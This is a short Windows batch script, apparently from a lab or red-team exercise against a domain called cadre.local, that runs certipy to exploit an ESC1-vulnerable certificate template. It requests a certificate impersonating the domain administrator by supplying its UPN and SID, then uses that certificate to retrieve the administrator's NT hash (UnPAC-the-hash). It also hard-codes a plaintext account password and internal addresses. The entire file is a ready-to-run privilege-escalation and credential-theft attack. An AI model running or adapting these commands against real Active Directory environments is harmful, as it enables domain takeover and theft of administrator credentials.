@echo off
REM Branch B WT050 ESC1 + WT053 UnPAC — certipy req with -sid then auth
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set PYTHONIOENCODING=utf-8

echo y | del esc1-admin.pfx 2>nul
echo y | del esc1-admin.hash 2>nul

echo === ESC1 req with -sid (administrator) ===
%PY%\certipy.exe req -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -ca cadre-CA -target dc01.cadre.local -target-ip 192.168.77.10 -dynamic-endpoint -timeout 45 -template CADRE-ESC1 -upn administrator@cadre.local -sid S-1-5-21-277764030-1371232215-1561074416-500 -out esc1-admin 2>&1
echo REQ_RC %ERRORLEVEL%
dir esc1-admin.pfx 2>&1

echo === UnPAC-the-Hash (certipy auth) ===
%PY%\certipy.exe auth -pfx esc1-admin.pfx -dc-ip 192.168.77.10 2>&1
echo AUTH_RC %ERRORLEVEL%
dir esc1-admin.hash 2>&1
